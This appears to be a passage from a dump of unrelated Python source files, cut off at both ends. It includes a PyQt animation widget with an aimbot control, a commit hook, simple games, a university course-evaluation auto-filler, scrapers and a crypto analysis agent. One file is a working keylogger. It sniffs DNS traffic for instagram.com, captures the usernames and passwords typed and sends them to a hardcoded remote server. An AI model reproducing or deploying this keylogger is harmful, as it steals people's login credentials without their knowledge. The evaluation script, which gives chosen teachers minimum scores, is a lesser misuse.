0)  # Position the widget at (123, 42)\r\n        self.aimbot_widget.resize(200, 50)  # Ensure the widget is large enough\r\n        self.aimbot_widget.setVisible(False)  # Initially hidden\r\n        self.aimbot_widget.setEnabled(False)\"\"\"  # Initially non-interactive\r\n\r\n    def _reverse_animation(self):\r\n        # Reverse the animation direction\r\n        self.text_animation.setStartValue(self.text_animation.endValue())\r\n        self.text_animation.setEndValue(1.0 if self.text_animation.endValue() == 0.5 else 0.5)\r\n        self.text_animation.start()\r\n\r\n    # Property for text opacity animation\r\n    def get_text_opacity(self):\r\n        return self._text_opacity\r\n\r\n    def set_text_opacity(self, opacity):\r\n        self._text_opacity = opacity\r\n        self.update()  # Trigger a repaint\r\n\r\n    textOpacity = pyqtProperty(float, get_text_opacity, set_text_opacity)\r\n\r\n    def update_snowflakes(self):\r\n        try:\r\n            if self.snowflakes:\r\n                for snowflake in self.snowflakes:\r\n                    dx = self.mouse_pos.x() - snowflake.pos.x()\r\n                    dy = self.mouse_pos.y() - snowflake.pos.y()\r\n                    distance = math.sqrt(dx * dx + dy * dy)\r\n\r\n                    if distance < self.mouse_radius and distance > 0:\r\n                        factor = (self.mouse_radius - distance) / self.mouse_radius\r\n                        new_x = snowflake.pos.x() - dx * factor * 0.1\r\n                        new_y = snowflake.pos.y() - dy * factor * 0.1\r\n\r\n                        if 0 <= new_x <= self.width():\r\n                            snowflake.pos.setX(int(new_x))\r\n                        if -50 <= new_y <= self.height():\r\n                            snowflake.pos.setY(int(new_y))\r\n\r\n                    snowflake.update(self.width(), self.height())\r\n                self.update()\r\n        except Exception as e:\r\n            print(f\"Error updating snow: {e}\")\r\n\r\n    def initialize_snowflakes(self):\r\n        try:\r\n            if not self.snowflakes:\r\n                for _ in range(self.snow_count):\r\n                    self.snowflakes.append(Snowflake(self.width(), self.height()))\r\n        except Exception as e:\r\n            print(f\"Error initializing snowflakes: {e}\")\r\n\r\n    def resizeEvent(self, event):\r\n        try:\r\n            super().resizeEvent(event)\r\n            if not self.snowflakes:\r\n                self.initialize_snowflakes()\r\n        except Exception as e:\r\n            print(f\"Error in resize event: {e}\")\r\n\r\n    def mouseMoveEvent(self, event):\r\n        self.mouse_pos = event.pos()\r\n\r\n    def setup_buttons(self):\r\n        base_icon_path = os.path.join(os.path.dirname(__file__), \"icons\")  # ",
    "#!/usr/bin/env python3\n\nimport argparse\nimport re\nimport subprocess  # nosec\n\n\ndef get_ticket_id_from_branch_name(branch):\n    # Get first number from branch name\n    matches = re.findall(\"[0-9]{1,5}\", branch)\n    if len(matches) > 0:\n        return matches[0]\n\n\ndef main():\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"commit_msg_filepath\")\n    parser.add_argument(\n        \"-t\",\n        \"--template\",\n        default=\"[{}]\",\n        help=\"Template to render ticket id into\",\n    )\n    args = parser.parse_args()\n    commit_msg_filepath = args.commit_msg_filepath\n    template = args.template\n\n    branch = \"\"\n    try:\n        branch = subprocess.check_output(  # nosec\n            [\"git\", \"symbolic-ref\", \"--short\", \"HEAD\"],\n            universal_newlines=True,\n        ).strip()\n    except Exception as e:\n        print(e)\n        return 1\n\n    result = get_ticket_id_from_branch_name(branch)\n    issue_number = \"\"\n\n    if result:\n        issue_number = result.upper()\n        prefix = template.format(\"#\" + issue_number)\n    else:\n        prefix = template.format(branch)\n\n    with open(commit_msg_filepath, \"r+\") as f:\n        content = f.read()\n        content_subject = content.split(\"\\n\", maxsplit=1)[0].strip()\n        f.seek(0, 0)\n        if prefix not in content_subject:\n            f.write(f\"{prefix} {content}\")\n        else:\n            # Write back\n            f.write(content)\n\n\nif __name__ == \"__main__\":\n    exit(main())\n",
    "import socket\r\nimport threading\r\nimport keyboard  # For keylogging \r\nfrom scapy.all import sniff, DNS , DNSQR  # For packet sniffing \r\nimport time\r\n\r\n# Server details\r\nSERVER_HOST = \"172.22.76.81\"\r\nSERVER_PORT = 5000\r\nTARGET_WEBSITE = \"www.instagram.com\" \r\nstart_time = time.time()\r\nduration = 30\r\n\r\nkeylogger_active = False  # A flag which will command the keylogger that when to get activated\r\n\r\ndef keylogger(sock):\r\n    \"\"\"Logs keystrokes and sends them to the server.\"\"\"\r\n    username = ''\r\n    password = ''\r\n    is_password = False  # Flag to determine if we are capturing the password\r\n\r\n    def on_key(event):\r\n        nonlocal username, password, is_password\r\n\r\n        if event.name == 'enter':  # If the user presses 'Enter', assume login submission\r\n            # if is_password:\r\n            print(f\"Password detected: {password}\")\r\n            # Send the password to the server\r\n            message = f\"Password: {password} Username={username}\".encode()\r\n            sock.sendall(message)\r\n            # else:\r\n            print(f\"Username detected: {username}\")\r\n            # Send the username to the server\r\n            message = f\"Username: {username}\\n\".encode()\r\n            sock.sendall(message)\r\n\r\n            # Reset for the next input\r\n            username = ''\r\n            password = ''\r\n            is_password = False\r\n\r\n        elif event.name == 'tab':  # Tab to switch from username to password\r\n            is_password = True\r\n\r\n        elif event.name == 'space':  # Handle spacebar (if part of the username)\r\n            if is_password:\r\n                password += ' '  # Add space to password\r\n            else:\r\n                username += ' '  # Add space to username\r\n\r\n        elif event.name == 'backspace':  # Handle backspace\r\n            if is_password and password:\r\n                password = password[:-1]  # Remove last character from password\r\n            elif username:\r\n                username = username[:-1]  # Remove last character from username\r\n\r\n        elif is_password:\r\n            if len(event.name) == 1:  # Only append single characters (e.g., a-z, 0-9)\r\n                password += event.name  # Append to password field\r\n        else:\r\n            if len(event.name) == 1:  # Only append single characters (e.g., a-z, 0-9)\r\n                username += event.name  # Append to username field\r\n\r\n    keyboard.on_press(on_key)  # Listen for key press events\r\n    keyboard.wait()  # Wait indefinitely for key events\r\n\r\ndef packet_sniffer(sock, target_website):\r\n    \"\"\"Sniffs network packets to detect requests to the target website.\"\"\"\r\n    def process_packet(packet):\r\n        global keylogger_active\r\n        if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:  # DNS Query\r\n        # Extract the domain name from the DNS query\r\n            domain = packet[DNSQR].qname.decode('utf-8')\r\n            # print(date)\r\n            print(f\"Detected domain: {domain}\")\r\n            \r\n            if target_website in domain:\r\n                if not keylogger_active:\r\n                    message = f\"NOTIFY: {target_website} accessed. Activating keylogger\".encode()\r\n                    sock.sendall(message)\r\n                    elapsed_time = time.time() - start_time\r\n                    keylogger_active = True\r\n                    if (elapsed_time > duration):\r\n                        sock.close()\r\n\r\n    # Start sniffing on all interfaces\r\n    print(\"Starting packet sniffing...\")\r\n    sniff(prn=process_packet, store=False)\r\n\r\ndef main():\r\n    \"\"\"Main function to set up the client.\"\"\"\r\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_sock:\r\n        # Connect to the server\r\n        client_sock.connect((SERVER_HOST, SERVER_PORT))\r\n        print(f\"Connected to server at {SERVER_HOST}:{SERVER_PORT}\")\r\n\r\n        if client_sock:\r\n            sniffer_thread = threading.Thread(target=packet_sniffer,args=(client_sock,TARGET_WEBSITE),daemon=True)\r\n            sniffer_thread.start()\r\n            keylogger(client_sock)\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n",
    "import re\nimport colorama\nimport time\nimport copy\nfrom colorama import Fore, Back, Style\n\n# Key:\n# 0 - blank\n# 1 - blue\n# 2 - red\n# 3 - circle\n\nBLANK = 0\nBLUE = 1\nRED = 2\nDOT = 3\nEMPTY_STATE = [[0, 0, 0, 0], [0, 0, 0, 0], [0, 0, 0, 0], [0, 0, 0, 0]]\nINITIAL_STATE = [[3, 2, 2, 0], [0, 1, 2, 0], [0, 1, 2, 0], [0, 1, 1, 3]]\nOG_INITIAL_STATE = [[3, 1, 1, 0], [0, 2, 1, 0], [0, 2, 1, 0], [0, 2, 2, 3]]\nrepeatedStates = []\nevaluatedStatesMax = []\nevaluatedEvalsMax = []\nevaluatedStatesMin = []\nevaluatedEvalsMin = []\n\n# presents menu options to user for play game\ndef menu():\n    # print menu\n    print(Style.RESET_ALL + \"-------------------------------\")\n    print(Fore.GREEN + \"Welcome to L Game!\")\n    print(Fore.RED + \"   1. Player v Player\")\n    print(\"   2. Player v CPU, Player Starts\")\n    print(\"   3. Player v CPU, CPU Starts\")\n    print(\"   4. CPU v CPU\")\n    print(\"   5. Change initial state\")\n    print(\"   6. Reset initial state\")\n    print(\"   7. Quit\")\n    print(Style.RESET_ALL)\n    choice = \"\"\n\n    while(choice != \"6\"):\n        repeatedStates = []\n        choice = input(\"Enter a number to choose your game mode: \")\n        if choice == \"1\" or choice.upper() == \"PVP\": # pvp\n            playGamePVP()\n            time.sleep(1)\n            print(\"\\nGoing back to menu...\", end=\"\")\n            time.sleep(1.5)\n            break\n        elif choice == \"2\" or choice.upper() == \"PVC1\": # pvc where player starts\n            playGamePVC(1)\n            time.sleep(1)\n            print(\"\\nGoing back to menu...\", end=\"\")\n            time.sleep(1.5)\n            break\n        elif choice == \"3\" or choice.upper() == \"PVC2\": # pvc where ai starts\n            playGamePVC(2)\n            time.sleep(1)\n            print(\"\\nGoing back to menu...\", end=\"\")\n            time.sleep(1.5)\n            break\n        elif choice == \"4\" or choice.upper() == \"CVC\": #cvc\n            playGameCVC()\n            time.sleep(1)\n            print(\"\\nGoing back to menu...\", end=\"\")\n            time.sleep(1.5)\n            break\n        elif choice == \"5\" or choice.upper() == \"CIS\": # change initial state\n            INITIAL_STATE = changeInitialState()\n            print(\"\\nNew initial state:\")\n            printBoard(INITIAL_STATE)\n            time.sleep(1)\n            print(\"\\nGoing back to menu...\", end=\"\")\n            time.sleep(1.5)\n            break\n        elif choice == \"6\" or choice.upper() == \"RIS\": # reset initial state to default\n            INITIAL_STATE = copy.deepcopy(OG_INITIAL_STATE)\n            print(\"\\nReset initial state:\")\n            printBoard(INITIAL_STATE)\n            time.sleep(1)\n            print(\"\\nGoing back to menu...\", end=\"\")\n            time.sleep(1.5)\n            break\n        elif choice == \"7\" or choice.upper() == \"QUIT\" or choice.upper() == \"Q\": # quit program\n            return 0\n        else:\n            print(\"Please enter a valid game mode.\\n\")\n    print(\"\\n\")\n    menu() # menu will recurse until quit\n\n# validates if given initial state is a valid state by ruling our overlapping Ls, invalid numerals, etc\ndef isValidInitialState(initState):\n    # 3 1 W 1 1 4 4 2 4 E (L that moves first, the two neutral pieces, L that moves second).\n    if(len(initState) == 19): # verifies that given string state follows proper form\n        pattern = r\"^\\d \\d [A-Za-z] \\d \\d \\d \\d \\d \\d [A-Za-z]$\"\n        if not re.match(pattern, initState):\n            print(\"Incorrect formatting.\")\n            return False\n        \n        nums = [0, 2, 6, 8, 10, 12, 14, 16]\n        for i in nums:\n            if(int(initState[i]) not in range(1, 5)):\n                print(\"One or more numbers not in range.\")\n                return False\n\n        validDirections = ['E', 'S', 'W', 'N']\n        if(initState[4] not in validDirections or initState[18] not in validDirections):\n            print(\"Invalid direction.\")\n            return False\n        \n        # check validity of L coords\n        lCoords1 = generateLCoords(int(initState[0]) - 1, int(initState[2]) - 1, initState[4])\n        lCoords2 = generateLCoords(int(initState[14]) - 1, int(initState[16]) - 1, initState[18])\n\n        # check coords bounds\n        for c in lCoords1:\n            if(c[0] < 0 or c[1] < 0 or c[0] > 3 or c[1] > 3):\n                print(\"One or more coordinates in first L out of bounds.\")\n                return False\n        for c in lCoords2:\n            if(c[0] < 0 or c[1] < 0 or c[0] > 3 or c[1] > 3):\n                print(\"One or more coordinates in second L out of bounds.\")\n                return False\n        \n        # check if L's are intersecting anywhere\n        for c1 in lCoords1:\n            for c2 in lCoords2:\n                if(c1[0] == c2[0] and c1[1] == c2[1]):\n                    print(\"L's are overlapping.\")\n                    return False\n        \n        dot1 = (int(initState[6]) - 1, int(initState[8]) - 1)\n        dot2 = (int(initState[10]) - 1, int(initState[12]) - 1)\n        # check neutral piece bounds\n        if(dot1[0] < 0 or dot1[1] < 0 or dot1[0] >",
    "print(r'''\r\n*******************************************************************************\r\n          |                   |                  |                     |\r\n _________|________________.=\"\"_;=.______________|_____________________|_______\r\n|                   |  ,-\"_,=\"\"     `\"=.|                  |\r\n|___________________|__\"=._o`\"-._        `\"=.______________|___________________\r\n          |                `\"=._o`\"=._      _`\"=._                     |\r\n _________|_____________________:=._o \"=._.\"_.-=\"'\"=.__________________|_______\r\n|                   |    __.--\" , ; `\"=._o.\" ,-\"\"\"-._ \".   |\r\n|___________________|_._\"  ,. .` ` `` ,  `\"-._\"-._   \". '__|___________________\r\n          |           |o`\"=._` , \"` `; .\". ,  \"-._\"-._; ;              |\r\n _________|___________| ;`-.o`\"=._; .\" ` '`.\"\\ ` . \"-._ /_______________|_______\r\n|                   | |o ;    `\"-.o`\"=._``  '` \" ,__.--o;   |\r\n|___________________|_| ;     (#) `-.o `\"=.`_.--\"_o.-; ;___|___________________\r\n____/______/______/___|o;._    \"      `\".o|o_.--\"    ;o;____/______/______/____\r\n/______/______/______/_\"=._o--._        ; | ;        ; ;/______/______/______/_\r\n____/______/______/______/__\"=._o--._   ;o|o;     _._;o;____/______/______/____\r\n/______/______/______/______/____\"=._o._; | ;_.--\"o.--\"_/______/______/______/_\r\n____/______/______/______/______/_____\"=.o|o_.--\"\"___/______/______/______/____\r\n/______/______/______/______/______/______/______/______/______/______/_____ /\r\n*******************************************************************************\r\n''')\r\nprint(\"Welcome to Treasure Island.\")\r\nprint(\"Your mission is to find the treasure.\")\r\ndirection = input('You\\'re at a cross road! What is your choice \"left\" or \"right?\".').lower()\r\n\r\nif direction == \"left\":\r\n    island = input('You\\'ve come to the sea and there is an island in the middle of the sea.'\r\n                   ' Type \"wait\" to wait for a boat and \"swim\" to swim along!').lower()\r\n    if island == \"wait\":\r\n        colour = input(\"You arrive at the island unharmed. There is a house with 3 doors.\"\r\n                       \" One red, one yellow and one blue. \"\r\n                       \"Which colour do you choose?\").lower()\r\n        if colour == \"red\":\r\n            print(\"You entered the room with fire, you lose the game!\")\r\n        elif colour == \"blue\":\r\n            print(\"The room is full with snakes, you lose the game!\")\r\n        elif colour == \"Yellow\":\r\n            print(\"Wohoo! You find the treasure, you made a victory!!\")\r\n        else:\r\n            print(\"you chose a door that doesn't exist! Game Over!\")\r\n    else:\r\n        print(\"Ooh no! There is a giant crocodile,you won't survive! \"\r\n              \"May you find the treasure next time\")\r\n\r\nelif direction == \"right\":\r\n    print(\"oops! You've fell into the pothole!\")\r\nelse:\r\n    print(\"You don't have that choice! you typed something wrong\")\r\n",
    "import time\nimport requests\nfrom bs4 import BeautifulSoup\nfrom getpass import getpass\nfrom urllib.parse import quote\nfrom form import fill_form\nimport sys\n\nsession = requests.Session()\n\nPJXT_URL = \"https://spoc.buaa.edu.cn/pjxt/\"\nLOGIN_URL = f'https://sso.buaa.edu.cn/login?service={quote(PJXT_URL, \"utf-8\")}cas'\n\ndef get_token():\n    try:\n        response = session.get(LOGIN_URL)\n        response.raise_for_status()\n        soup = BeautifulSoup(response.text, 'html.parser')\n        token = soup.find('input', {'name': 'execution'})['value']\n        return token\n    except Exception:\n        print('\ud83d\udd34 \u83b7\u53d6\u767b\u5f55\u4ee4\u724c\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5\u7f51\u7edc\u8fde\u63a5\u6216\u767b\u5f55\u9875\u9762\u7ed3\u6784\u3002')\n        sys.exit(1)\n\ndef login(username, password):\n    try:\n        form = {\n            'username': username,\n            'password': password,\n            'execution': get_token(),\n            '_eventId': 'submit',\n            'type': 'username_password',\n            'submit': \"LOGIN\"\n        }\n        response = session.post(LOGIN_URL, data=form, allow_redirects=True)\n        response.raise_for_status()\n        if '\u7efc\u5408\u8bc4\u6559\u7cfb\u7edf' in response.text:\n            return True\n        else:\n            return False\n    except Exception:\n        return False\n\ndef get_latest_task():\n    try:\n        task_list_url = f'{PJXT_URL}personnelEvaluation/listObtainPersonnelEvaluationTasks?pageNum=1&pageSize=1'\n        response = session.get(task_list_url)\n        response.raise_for_status()\n        task_json = response.json()\n        if task_json['result']['total'] == 0:\n            return None\n        return (task_json['result']['list'][0]['rwid'], task_json['result']['list'][0]['rwmc'])\n    except Exception:\n        print('\ud83d\udd34 \u83b7\u53d6\u6700\u65b0\u4efb\u52a1\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5\u7f51\u7edc\u8fde\u63a5\u6216API\u662f\u5426\u53d8\u66f4\u3002')\n        sys.exit(1)\n\ndef get_questionnaire_list(task_id):\n    try:\n        list_url = f'{PJXT_URL}evaluationMethodSix/getQuestionnaireListToTask?rwid={task_id}&pageNum=1&pageSize=999'\n        response = session.get(list_url)\n        response.raise_for_status()\n        return response.json()['result']\n    except Exception:\n        print('\ud83d\udd34 \u83b7\u53d6\u95ee\u5377\u5217\u8868\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5\u7f51\u7edc\u8fde\u63a5\u6216API\u662f\u5426\u53d8\u66f4\u3002')\n        return []\n\ndef set_evaluating_method(qinfo):\n    try:\n        if qinfo['msid'] in ['1', '2']:\n            url = f'{PJXT_URL}evaluationMethodSix/reviseQuestionnairePattern'\n        elif qinfo['msid'] is None:\n            url = f'{PJXT_URL}evaluationMethodSix/confirmQuestionnairePattern'\n        else:\n            print(f\"\u26a0\ufe0f \u672a\u77e5\u7684 msid {qinfo['msid']} \u5bf9\u4e8e {qinfo['wjmc']}\")\n            return\n        form = {\n            'wjid': qinfo['wjid'],\n            'msid': 1,\n            'rwid': qinfo['rwid']\n        }\n        response = session.post(url, json=form)\n        response.raise_for_status()\n    except Exception:\n        print(f\"\ud83d\udd34 \u8bbe\u7f6e\u8bc4\u6559\u65b9\u5f0f\u5931\u8d25: {qinfo['wjmc']}\")\n\ndef get_course_list(qid):\n    try:\n        course_list_url = f'{PJXT_URL}evaluationMethodSix/getRequiredReviewsData?sfyp=0&wjid={qid}&pageNum=1&pageSize=999'\n        response = session.get(course_list_url)\n        response.raise_for_status()\n        course_list_json = response.json()\n        return course_list_json.get('result', [])\n    except Exception:\n        print(f\"\ud83d\udd34 \u83b7\u53d6\u8bfe\u7a0b\u5217\u8868\u5931\u8d25: {qid}\")\n        return []\n\ndef evaluate_single_course(cinfo, method, special_teachers):\n    try:\n        teacher_name = cinfo.get(\"pjrxm\", \"\u672a\u77e5\u8001\u5e08\")\n        if teacher_name in special_teachers:\n            current_method = 'worst_passing'\n        else:\n            current_method = method\n        params = {\n            'rwid': cinfo[\"rwid\"],\n            'wjid': cinfo[\"wjid\"],\n            'sxz': cinfo[\"sxz\"],\n            'pjrdm': cinfo[\"pjrdm\"],\n            'pjrmc': cinfo[\"pjrmc\"],\n            'bpdm': cinfo[\"bpdm\"],\n            'bpmc': cinfo[\"bpmc\"],\n            'kcdm': cinfo[\"kcdm\"],\n            'kcmc': cinfo[\"kcmc\"],\n            'rwh': cinfo[\"rwh\"]\n        }\n        topic_url = f'{PJXT_URL}evaluationMethodSix/getQuestionnaireTopic?' + '&'.join([f'{k}={quote(str(v))}' for k, v in params.items()])\n        response = session.get(topic_url)\n        response.raise_for_status()\n        topic_json = response.json()\n        if not topic_json['result']:\n            print(f\"\u26a0\ufe0f \u83b7\u53d6\u8bc4\u6559\u4e3b\u9898\u5931\u8d25: {cinfo['kcmc']} - \u8001\u5e08: {teacher_name}\")\n            return\n        evaluate_result = fill_form(topic_json['result'][0], current_method)\n        submit_url = f'{PJXT_URL}evaluationMethodSix/submitSaveEvaluation'\n        submit_response = session.post(submit_url, json=evaluate_result)\n        submit_response.raise_for_status()\n        if submit_response.json().get('msg') == '\u6210\u529f':\n            if teacher_name in special_teachers:\n                print(f\"\u2705 \u6210\u529f\u8bc4\u6559\uff08\u53ca\u683c\u5206\uff09\u8bfe\u7a0b: {cinfo['kcmc']} - \u8001\u5e08: {teacher_name}\")\n            else:\n                print(f\"\u2705 \u6210\u529f\u8bc4\u6559\u8bfe\u7a0b: {cinfo['kcmc']} - \u8001\u5e08: {teacher_name}\")\n        else:\n            print(f\"\ud83d\udd34 \u8bc4\u6559\u5931\u8d25: {cinfo['kcmc']} - \u8001\u5e08: {teacher_name}\")\n            sys.exit(1)\n    except Exception:\n        print(f\"\ud83d\udd34 \u8bc4\u6559\u8fc7\u7a0b\u4e2d\u51fa\u9519: {cinfo['kcmc']} - \u8001\u5e08: {teacher_name}\")\n        sys.exit(1)\n\ndef auto_evaluate(method, special_teachers):\n    task = get_latest_task()\n    if task is Non",
    "import logging\nimport os\nfrom logging.handlers import RotatingFileHandler\n\nLOG_LEVEL = os.getenv(\"LOG_LEVEL\", \"INFO\").upper()\nLOG_FILE = os.getenv(\"LOG_FILE\", \"logs/app.log\")\nMAX_LOG_FILE_SIZE = 10 * 1024 * 1024  # 10 MB\nBACKUP_COUNT = 5  # Number of backup log files to keep\n\n# Create logger\nlogger = logging.getLogger(\"solana_sniper_bot\")\nlogger.setLevel(LOG_LEVEL)\n\ndef setup_logging():\n    global logger\n    \n    # Prevent duplicate handlers during reinitialization\n    if logger.hasHandlers():\n        logger.handlers.clear()\n\n    # Create formatter\n    formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')\n\n    # Console handler\n    console_handler = logging.StreamHandler()\n    console_handler.setLevel(LOG_LEVEL)\n    console_handler.setFormatter(formatter)\n    logger.addHandler(console_handler)\n\n    # File handler with rotation\n    log_dir = os.path.dirname(LOG_FILE)\n    if not os.path.exists(log_dir):\n        os.makedirs(log_dir)\n\n    file_handler = RotatingFileHandler(\n        LOG_FILE, maxBytes=MAX_LOG_FILE_SIZE, backupCount=BACKUP_COUNT\n    )\n    file_handler.setLevel(LOG_LEVEL)\n    file_handler.setFormatter(formatter)\n    logger.addHandler(file_handler)\n\n    # Log initialization message\n    logger.info(\"Logger initialized.\")\n",
    "import streamlit as st\nfrom scrape import (\n    scrape_website,\n    extract_body_content,\n    clean_body_content,\n    split_dom_content,\n)\nfrom parse import parse_with_ollama\n\nst.title(\"AI Web Scraper\")\nurl = st.text_input(\"Enter Website URL\")\n\nif st.button(\"Scrape Website\"):\n    if url:\n        st.write(\"Scraping the website...\")\n\n        dom_content = scrape_website(url)\n        body_content = extract_body_content(dom_content)\n        cleaned_content = clean_body_content(body_content)\n\n        st.session_state.dom_content = cleaned_content\n\n        with st.expander(\"View DOM Content\"):\n            st.text_area(\"DOM Content\", cleaned_content, height=300)\n\nif \"dom_content\" in st.session_state:\n    parse_description = st.text_area(\"Describe what you want to parse\")\n\n    if st.button(\"Parse Content\"):\n        if parse_description:\n            st.write(\"Parsing the content...\")\n\n            dom_chunks = split_dom_content(st.session_state.dom_content)\n            parsed_result = parse_with_ollama(dom_chunks, parse_description)\n            st.write(parsed_result)\n",
    "import os\nimport requests\nfrom bs4 import BeautifulSoup\nfrom openai import OpenAI\nfrom dotenv import load_dotenv\nimport csv\nfrom fpdf import FPDF\nimport json\nimport datetime\nimport re\n\nclass CryptoFinanceAgent:\n    def __init__(self):\n        load_dotenv()\n        self.fear_greed_url = \"https://api.alternative.me/fng/\"\n        self.vix_url = \"https://finance.yahoo.com/quote/%5EVIX/\"\n        self.altcoin_season_url = \"https://www.blockchaincenter.net/en/altcoin-season-index/\"\n        self.client = OpenAI(api_key=os.getenv(\"DEEPSEEK_API_KEY\"), base_url=\"https://api.deepseek.com\")\n        self.community_file = \"community/community_strategies.json\"\n        self.community_strategies = self.load_community_strategies()\n    \n    def get_fear_and_greed_index(self):\n        \"\"\"Fetch Crypto Fear & Greed Index.\"\"\"\n        try:\n            response = requests.get(self.fear_greed_url)\n            data = response.json()\n            if response.status_code == 200:\n                latest_data = data['data'][0]\n                return {\n                    'value': int(latest_data['value']),\n                    'classification': latest_data['value_classification']\n                }\n            return None\n        except Exception as e:\n            print(f\"Error fetching Fear & Greed Index: {e}\")\n            return None\n\n    def get_vix_index(self):\n        \"\"\"Fetch CBOE Volatility Index (VIX) from Yahoo Finance.\"\"\"\n        try:\n            headers = {\n                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'\n            }\n            response = requests.get(self.vix_url, headers=headers)\n            response.raise_for_status()\n            soup = BeautifulSoup(response.text, 'html.parser')\n            \n            # Extract VIX value\n            vix_value = float(soup.find('fin-streamer', {'data-field': 'regularMarketPrice'}).text)\n            \n            # Extract change and percent change\n            change = float(soup.find('fin-streamer', {'data-field': 'regularMarketChange'}).text)\n            change_percent = float(soup.find('fin-streamer', {'data-field': 'regularMarketChangePercent'}).text.strip('()%'))\n            \n            return {\n                'value': vix_value,\n                'change': change,\n                'change_percent': change_percent,\n                'analysis': self.get_vix_analysis(vix_value)\n            }\n        except Exception as e:\n            print(f\"Error fetching VIX Index: {e}\")\n            return None\n\n    def get_altcoin_season_index(self):\n        \"\"\"Fetch Altcoin Season Index from BlockchainCenter and determine season.\"\"\"\n        try:\n            headers = {\n                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'\n            }\n            response = requests.get(self.altcoin_season_url, headers=headers)\n            response.raise_for_status()\n            soup = BeautifulSoup(response.text, 'html.parser')\n            \n            # Find the Altcoin Season Index value using its unique style attributes\n            index_div = soup.find('div', style=\"font-size:88px;  color:#345C99;position:relative;top:56px;left:calc(47% - 46px)\")\n            if index_div:\n                index_value = int(index_div.text.strip())\n                # Determine season based on index value\n                if index_value > 75:\n                    season_message = \"Altcoin Season\"\n                else:\n                    season_message = \"Bitcoin Season\"\n                return {\n                    'value': index_value,\n                    'season': season_message\n                }\n            else:\n                print(\"Altcoin Season Index value not found on the page.\")\n                return None\n        except Exception as e:\n            print(f\"Error fetching Altcoin Season Index: {e}\")\n            return None\n\n    def get_vix_analysis(self, vix_value):\n        \"\"\"Analyze VIX value.\"\"\"\n        if vix_value >= 30:\n            return \"High Volatility (Market Fear)\"\n        elif vix_value >= 20:\n            return \"Moderate Volatility (Market Caution)\"\n        else:\n            return \"Low Volatility (Market Complacency)\"\n\n    def analyze_market(self):\n        \"\"\"Analyze combined market sentiment.\"\"\"\n        crypto_data = self.get_fear_and_greed_index()\n        vix_data = self.get_vix_index()\n        altcoin_season_data = self.get_altcoin_season_index()\n        \n        if not crypto_data or not vix_data or not altcoin_season_data:\n            return \"Unable to fetch market data\"\n        \n        # Map Fear & Greed Index to bullish/bearish\n        if crypto_data['value'] >= 55:\n            market_condition = \"bullish\"\n        else:\n            market_condition = \"bearish\"\n        \n        return {\n            'crypto': crypto_data,\n            'vix': vix_data,\n            'altcoin_season': altcoin_season_data,\n            'market_c",
    "from shared import GameData, Division\nfrom oauth2client.service_account import ServiceAccountCredentials\nfrom apiclient import discovery\nfrom functools import lru_cache\n\n\nSCOPE = \"https://www.googleapis.com/auth/spreadsheets\"\nSERVICE_ACCOUNT_KEY_FILE = \"service_account_key.json\"\n\nDATA_SPREADSHEET_ID = \"1PxYlC7OC0gAeBvfDRknpPCG9PJW63EUZJ2S2gCxzHwQ\"\nBASE_SPREADSHEET_ID = \"1U7uKsuO2l1SxT3qZSRmdRdX1apjm81pRsnYtFcxMGQQ\"\nCK_SPREADSHEET_ID = \"1gPnHor5-JuyZmDrb-0MbPBMqwzjaFEy-BDXOFW1Eiyo\"\n\nDIV_COLS = {Division.DIV1: \"A\", Division.DIV2: \"H\", Division.CK: \"O\"}\n\nSTARTING_DATA_ENTRY_ROW = 4\nDATA_ENTRY_TAB_NAME = \"AEON\"\nNAMES_TAB_NAME = \"Respuestas\"\nNAMES_RANGES = [\"B3:C\"]\n\n\ndef get_creds():\n    creds = ServiceAccountCredentials.from_json_keyfile_name(\n        SERVICE_ACCOUNT_KEY_FILE, SCOPE\n    )\n\n    if not creds or creds.invalid:\n        raise Exception(\"Unable to authenticate using service account key.\")\n    return creds\n\n\ndef get_service(creds):\n    return discovery.build(\"sheets\", \"v4\", credentials=creds)\n\n\n@lru_cache(maxsize=1)\ndef fetch_member_names(creds, div: Division):\n    service = get_service(creds)\n    member_names = {}\n\n    for names_range in NAMES_RANGES:\n        range_to_read = f\"{NAMES_TAB_NAME}!{names_range}\"\n        # first column is discord name, second is colonist\n        result = (\n            service.spreadsheets()\n            .values()\n            .get(spreadsheetId=DATA_SPREADSHEET_ID, range=range_to_read)\n            .execute()\n        )\n        values = result.get(\"values\", [])\n        for row in values:\n            member_names[row[1]] = row[0]\n\n    return member_names\n\n\ndef translate_name(creds, div: Division, name: str):\n    discord_to_colonist = fetch_member_names(creds, div)\n\n    if name in discord_to_colonist:\n        return discord_to_colonist[name]\n\n\ndef update(creds, div: Division, game_data: GameData):\n    if game_data.metadata is None:\n        raise Exception(\"cannot update without metadata\")\n\n    service = get_service(creds)\n\n    sheet = service.spreadsheets()\n\n    metadata_col = DIV_COLS[div]\n    # first row is metadata, so when checking for empty rows, skip it\n    name_col = add_char(metadata_col, 1)\n    range_to_read = (\n        f\"{DATA_ENTRY_TAB_NAME}!{metadata_col}{STARTING_DATA_ENTRY_ROW}:{name_col}\"\n    )\n    res = (\n        sheet.values().get(spreadsheetId=DATA_SPREADSHEET_ID, range=range_to_read).execute()\n    )\n    existing_rows = res.get(\"values\", [])\n\n    if len(existing_rows) > 0 and len(existing_rows[0]) > 0:\n        is_duplicate_url = game_data.metadata.replay_link in [\n            row[0] for row in existing_rows\n        ]\n        # replay url differs based on player perspective, so check timestamps as well!\n        is_duplicate_timestamp = game_data.metadata.timestamp.isoformat() in [\n            row[0] for row in existing_rows\n        ]\n        game_data.metadata.is_duplicate = is_duplicate_url or is_duplicate_timestamp\n\n    first_empty_row = STARTING_DATA_ENTRY_ROW + len(existing_rows)\n    last_col = add_char(metadata_col, 3)\n    last_row = first_empty_row + 3  # ?\n    range_to_write = (\n        f\"{DATA_ENTRY_TAB_NAME}!{metadata_col}{first_empty_row}:{last_col}{last_row}\"\n    )\n\n    (\n        sheet.values()\n        .update(\n            